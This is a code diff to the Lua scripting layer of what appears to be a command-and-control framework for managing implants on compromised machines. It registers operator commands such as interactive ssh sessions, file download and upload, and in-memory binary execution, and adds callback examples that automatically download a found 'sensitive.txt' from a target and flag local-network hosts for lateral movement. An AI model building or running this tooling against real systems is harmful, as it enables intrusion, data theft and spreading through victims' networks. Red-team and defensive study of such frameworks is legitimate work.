@@ -154,6 +154,7 @@ end
 
 --[[
 implant_register_profile("linux-beacon", {
+    type     = "impl",
     lhost    = "10.0.0.1:4444",
     os       = "linux",
     arch     = "amd64",
@@ -164,27 +165,28 @@ implant_register_profile("linux-beacon", {
 ]]
 
 --[[
-The first argument of "command("impl","ping","Ping the implant", ping)" is the type of implant. Since the
-C2 may be dealing with many times of implants that must be different (windows implant, linux, IoT), 
-it is used for the C2 show commands that are handled by that type of implant (impl in this case).
-So just command handled by the impl implant type will be shown to the used, when interacting
-with a impl implant type.
+The first command argument is the payload type. It must exactly match the Type
+presented by the implant during registration and the TYPE set on its build
+profile. Type matching is case-sensitive. When a session is selected, only
+commands registered for that session's type are suggested and dispatchable.
 
-The implant must presents itself's type
+Valid type identifiers are 1-64 ASCII letters, digits, dots, underscores, or
+hyphens. Each command name may contain letters, digits, underscores, or hyphens.
+Register a command once for each payload type that implements it.
 ]]
 
--- type, name, desc, func
-command("impl","ping","Ping the implant", ping)
-command("impl","ssh","Get an interactive session", ssh)
-command("impl","download","Download a file", download)
-command("impl","upload","upload a file", upload)
-command("impl","kill","Kill implant", kill)
-command("impl","pwd","Get working dir", pwd)
-command("impl","cd","Change dir", cd)
-command("impl","ls","List dir", ls)
-command("impl","memexec","Execute binary in memory", memexec)
-command("impl","ifconfig","Display network interfaces", ifconfig)
-command("impl","cat","Display file contents (first 10KB)", cat)
+-- payload_type, name, description, handler
+command("impl", "ping", "Ping the implant", ping)
+command("impl", "ssh", "Get an interactive session", ssh)
+command("impl", "download", "Download a file", download)
+command("impl", "upload", "Upload a file", upload)
+command("impl", "kill", "Kill implant", kill)
+command("impl", "pwd", "Get working dir", pwd)
+command("impl", "cd", "Change dir", cd)
+command("impl", "ls", "List dir", ls)
+command("impl", "memexec", "Execute binary in memory", memexec)
+command("impl", "ifconfig", "Display network interfaces", ifconfig)
+command("impl", "cat", "Display file contents (first 10KB)", cat)
 
 --[[
 function OnRegister(...)
@@ -194,6 +196,8 @@ function OnRegister(...)
     print("Hostname:", args[3])
     print("User:", args[4])
     print("Socket:", args[5])
+    print("Session ID:", args[6])
+    print("Payload type:", args[7])
 end
 
 function OnCheck(...)
@@ -202,8 +206,11 @@ function OnCheck(...)
     print("UUID:", args[2])
     print("Hostname:", args[3])
     print("User:", args[4])
-    print("data:", args[5])
-    print("task:", args[6])
+    print("Socket:", args[5])
+    print("Session ID:", args[6])
+    print("Task:", args[7])
+    print("Data:", args[8])
+    print("Payload type:", args[9])
 end
 
 function OnResponse(...)
@@ -212,8 +219,11 @@ function OnResponse(...)
     print("UUID:", args[2])
     print("Hostname:", args[3])
     print("User:", args[4])
-    print("response:", args[5])
-    print("task:", args[6])
+    print("Socket:", args[5])
+    print("Session ID:", args[6])
+    print("Task:", args[7])
+    print("Response:", args[8])
+    print("Payload type:", args[9])
 end
 ]]
 
@@ -225,13 +235,13 @@ is received and is automatically removed after execution.
 
 Example 1: Simple task callback
     local task_id = add_task(CODE.PWD, "")
-    register_task_callback(task_id, function(task_id, response, name, uuid, hostname, user)
+    register_task_callback(task_id, function(task_id, response, name, uuid, hostname, user, payload_type)
         lua_print("Current directory: " .. response)
     end)
 
 Example 2: Chain tasks based on response
     local task_id = add_task(CODE.LS, "/tmp")
-    register_task_callback(task_id, function(task_id, response, name, uuid, hostname, user)
+    register_task_callback(task_id, function(task_id, response, name, uuid, hostname, user, payload_type)
         if string.match(response, "sensitive.txt") then
             lua_print("Found sensitive file, downloading...")
             add_task(CODE.DOWN, "/tmp/sensitive.txt")
@@ -240,7 +250,7 @@ Example 2: Chain tasks based on response
 
 Example 3: Conditional automation
     local task_id = add_task(CODE.IFCONFIG, "")
-    register_task_callback(task_id, function(task_id, response, name, uuid, hostname, user)
+    register_task_callback(task_id, function(task_id, response, name, uuid, hostname, user, payload_type)
         if string.match(response, "192.168") then
             lua_print(hostname .. " is on local network, proceeding with lateral movement")
             -- Add more tasks for lateral movement
@@ -254,6 +264,7 @@ Callback parameters:
     - uuid: Implant UUID
     - hostname: Target hostname  
     - user: Current user on target
+    - payload_type: Payload family used for command routing
 
 Note: Task-specific callbacks take precedence over the global OnResponse callback.
       The callback is removed after execution (one-time use).
